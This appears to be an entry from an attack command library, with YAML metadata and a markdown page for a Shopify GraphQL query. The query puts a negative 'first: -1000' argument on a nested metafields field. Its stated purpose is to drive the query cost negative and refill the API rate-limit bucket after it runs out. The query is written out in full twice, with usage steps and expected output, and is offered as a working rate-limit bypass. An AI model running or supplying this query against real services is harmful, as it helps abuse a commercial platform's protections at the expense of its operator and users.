---
data: |-
  {
    appInstallations(first: 10) {
      edges {
        node {
          id
          uninstallUrl
          accessScopes {
            description
            handle
          }
          accessScopes {
            description
            handle
          }
          accessScopes {
            description
            handle
          }
          accessScopes {
            description
            handle
          }
          launchUrl
          app {
            pricingDetailsSummary
            apiKey
            banner {
              altText
              metafields(first: -1000) {
                edges {
                  node {
                    description
                    value
                    namespace
                    id
                  }
                }
              }
            }
          }
          handle
          features
          pricingDetails
          published
          feedback {
            messages {
              message
            }
            link {
              url
            }
          }
        }
      }
    }
  }
tags:
  - graphql
  - refill
type: command
output: null
executor: graphql
platforms:
  - Web
  - Shopify
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.280Z'
id: 858e8aea-b167-4366-a57b-cb945c93cbbf
verified: false
validated: true
submitted: true
---
# negative-cost-appinstallations-query

## Command

```graphql
{
  appInstallations(first: 10) {
    edges {
      node {
        id
        uninstallUrl
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        launchUrl
        app {
          pricingDetailsSummary
          apiKey
          banner {
            altText
            metafields(first: -1000) {
              edges {
                node {
                  description
                  value
                  namespace
                  id
                }
              }
            }
          }
        }
        handle
        features
        pricingDetails
        published
        feedback {
          messages {
            message
          }
          link {
            url
          }
        }
      }
    }
  }
}
```

## Description

Modified high-cost query with negative 'first: -1000' in metafields to generate negative overall cost, refilling the Shopify GraphQL rate limit bucket.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| first: -1000 | Negative value in nested field causing refill | Yes |
| Other first: 10/2 | Standard positives for balance | Yes |

## Examples

### Basic Usage

Execute after depletion.

```graphql
{ appInstallations(first: 10) { ... metafields(first: -1000) ... } }
```

## Expected Output

Response with extensions { cost: -950 }, bucket restored to 1000.

## Related

- [[commands/high-cost-appinstallations-query]]
